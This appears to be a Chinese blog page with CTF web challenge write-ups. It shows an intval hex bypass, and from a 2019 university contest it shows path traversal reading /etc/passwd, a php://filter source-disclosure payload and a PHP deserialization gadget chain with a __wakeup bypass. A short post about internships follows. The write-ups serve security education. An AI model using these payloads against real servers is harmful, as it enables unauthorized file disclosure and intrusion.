<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name=<span class="string">'w3lc0me_To_sec_WIki'</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> name:</span><br><span class="line">    print(<span class="number">256</span>+ord(i))</span><br><span class="line"></span><br><span class="line">    <span class="number">375</span></span><br><span class="line">    <span class="number">307</span></span><br><span class="line">    <span class="number">364</span></span><br><span class="line">    <span class="number">355</span></span><br><span class="line">    <span class="number">304</span></span><br><span class="line">    <span class="number">365</span></span><br><span class="line">    <span class="number">357</span></span><br><span class="line">    <span class="number">351</span></span><br><span class="line">    <span class="number">340</span></span><br><span class="line">    <span class="number">367</span></span><br><span class="line">    <span class="number">351</span></span><br><span class="line">    <span class="number">371</span></span><br><span class="line">    <span class="number">357</span></span><br><span class="line">    <span class="number">355</span></span><br><span class="line">    <span class="number">351</span></span><br><span class="line">    <span class="number">343</span></span><br><span class="line">    <span class="number">329</span></span><br><span class="line">    <span class="number">363</span></span><br><span class="line">    <span class="number">361</span></span><br></pre></td></tr></table></figure>
<p>然后进行替换得到<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">value[]=<span class="number">375</span>&amp;value[]=<span class="number">307</span>&amp;value[]=<span class="number">364</span>&amp;value[]=<span class="number">355</span>&amp;value[]=<span class="number">304</span>&amp;value[]=<span class="number">365</span>&amp;value[]=<span class="number">357</span>&amp;value[]=<span class="number">351</span>&amp;value[]=<span class="number">340</span>&amp;value[]=<span class="number">367</span>&amp;value[]=<span class="number">351</span>&amp;value[]=<span class="number">371</span>&amp;value[]=<span class="number">357</span>&amp;value[]=<span class="number">355</span>&amp;value[]=<span class="number">351</span>&amp;value[]=<span class="number">343</span>&amp;value[]=<span class="number">329</span>&amp;value[]=<span class="number">363</span>&amp;value[]=<span class="number">361</span></span><br></pre></td></tr></table></figure></p>
<p>之后要绕过的就是<code>password</code>的值要小于<code>232</code>但加<code>1</code>要大于<code>233</code></p>
<p><code>intval</code>转换的规则</p>
<p>如果遇到数字则转换</p>
<p>如果遇到非数字则停止转换</p>
<p>要小于<code>232</code>的是直接使用<code>intval</code>进行转换</p>
<p>要大于<code>233</code>的是在进行加法后进行转换</p>
<p>于是构造</p>
<p><code>password=0x300</code></p>
<p>该值转换后的结果为<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">769</span><br></pre></td></tr></table></figure></p>
<p>最终payload为<br><code>http://www.jasec.cn/web1/?password=0x300&amp;value[]=375&amp;value[]=307&amp;value[]=364&amp;value[]=355&amp;value[]=304&amp;value[]=365&amp;value[]=357&amp;value[]=351&amp;value[]=340&amp;value[]=367&amp;value[]=351&amp;value[]=371&amp;value[]=357&amp;value[]=355&amp;value[]=351&amp;value[]=343&amp;value[]=329&amp;value[]=363&amp;value[]=361</code></p>
<h2 id="2019全国大学生信息安全竞赛"><a href="#2019全国大学生信息安全竞赛" class="headerlink" title="2019全国大学生信息安全竞赛"></a>2019全国大学生信息安全竞赛</h2><p>打开题目,在f12源代码中可以发现提示我们访问<code>index.php?file=xxx.php</code>以及<code>hint.php</code></p>
<p>访问index.php?file=hint.php提示缺少参数,但看起来应该是文件包含</p>
<p>构造<code>/index.php?file=../../../../../../../etc/passwd</code>可以查看到本地文件</p>
<p>于是构造</p>
<p><code>/index.php?file=php://filter/read=convert.base64-encode/resource=./index.php</code></p>
<p>可以查看源代码</p>
<p>查看<code>index.php</code>与<code>hint.php</code>的源代码后发现</p>
<p>传入的<code>file</code>参数会被包含进<code>index.php</code></p>
<p>除此之外还要传递一个<code>payload</code>参数</p>
<p>该参数在后面会被反序列化,结合<code>hint.php</code>里的两个类可以造成读取任意文件.</p>
<h3 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'url'</span>.$url[<span class="string">'query'</span>].<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'query'</span>.$query.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'url query'</span>.$url[<span class="string">'query'</span>].<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">    <span class="comment">// print_r(serialize($query));</span></span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123;</span><br><span class="line">    	    <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">    	    <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// $payload = unserialize($payload);</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<h3 id="hint-php"><a href="#hint-php" class="headerlink" title="hint.php"></a>hint.php</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>可以看到<code>file</code>参数和<code>payload</code>参数都对<code>flag</code>字段进行了过滤.但没有直接对<code>payload</code>进行过滤而是对url的值进行了过滤</p>
<p>于是我们在<code>index.php</code>前添加<code>///</code>阻止<code>url</code>正常获取值</p>
<p><code>///index.php?file=hint.php</code></p>
<p>下一步就是构造带有<code>falg.php</code>的序列化值</p>
<p>在本地的hint.php修改代码为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = &amp;<span class="keyword">$this</span>-&gt;token;   <span class="comment">//直接将token_flag的值改为token的引用,这样在随机md5之后再判断依然相等</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">// echo 'exec getFlag()';</span></span><br><span class="line">        <span class="comment">// $this-&gt;token_flag = md5(rand(1,10000));</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>hint.php</code>的代码最后添加</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$f=<span class="keyword">new</span> Flag(<span class="string">'flag.php'</span>);</span><br><span class="line"></span><br><span class="line">$h=<span class="keyword">new</span> Handle($f);</span><br><span class="line">$s=serialize($h).<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> $s;</span><br></pre></td></tr></table></figure>
<p>本地构造payload</p>
<p><code>O:6:&quot;Handle&quot;:1:{s:14:&quot;Handlehandle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}}</code></p>
<p>格式化 “ 替换成  %22  ,  类名附近添加%00</p>
<p><code>O:6:%22Handle%22:1:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:8:%22flag.php%22;s:5:%22token%22;N;s:10:%22token_flag%22;R:4;}}</code></p>
<p>但在<code>Handle</code>的<code>__wakeup</code>中所有变量被重置了,但在序列化字符串长度大于实际长度的时候会跳过<code>weakup</code>,所以我们将<code>Handle</code>的值加一</p>
<p><code>O:6:%22Handle%22:2:{s:14:%22%00Handle%00handle%22;O:4:%22Flag%22:3:{s:4:%22file%22;s:8:%22flag.php%22;s:5:%22token%22;N;s:10:%22token_flag%22;R:4;}}</code></p>
<p>完整payload</p>
<p><code>ichunqiu.com///index.php?file=hint.php&amp;payload=O:6:&quot;Handle&quot;:2:{s:14:&quot;%00Handle%00handle&quot;;O:4:&quot;Flag&quot;:3:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;s:5:&quot;token&quot;;N;s:10:&quot;token_flag&quot;;R:4;}}</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$flag = <span class="string">'flag&#123;44623d5b-79ab-479a-bfdf-285856871e4e&#125;'</span>; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2019/04/22/关于快要实习了的碎碎念/">关于快要实习了的碎碎念</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-04-22</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/think/">think</a></span><div class="content"><p>看着身边的同学们都忙着想要去实习,而我却还在碌碌无为感到很慌.</p>
<p>前段时间参加了四个CTF比赛.其中两个得零分,剩下两个的排名还算靠前.不得不感叹自己的渺小.我以为的很强在别人眼里可能不值一提.我以为的很弱却不一定是最弱.</p>
<p>嗯,这么一想以我的能力去找工作也是能找到的吧,总之还是加油吧!</p>
<p><img src="https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/001x01.jpg" alt="IMG"></p>
</div><hr></div><nav id="pagination"><div class="pagination"><span class="page-number current">1</span></div></nav></div></div><footer class="footer-bg" style="background-image: url(https://raw.githubusercontent.com/gwjczwy/gwjczwy.github.io/master/img/background.png)"><div class="layout" id="footer"><div class="copyright">&copy;2019 By Arnoux</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv"><i class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span><span></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv"><i class="fa fa-eye"></i><span id="busuanzi_value_site_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
}</script></body></html>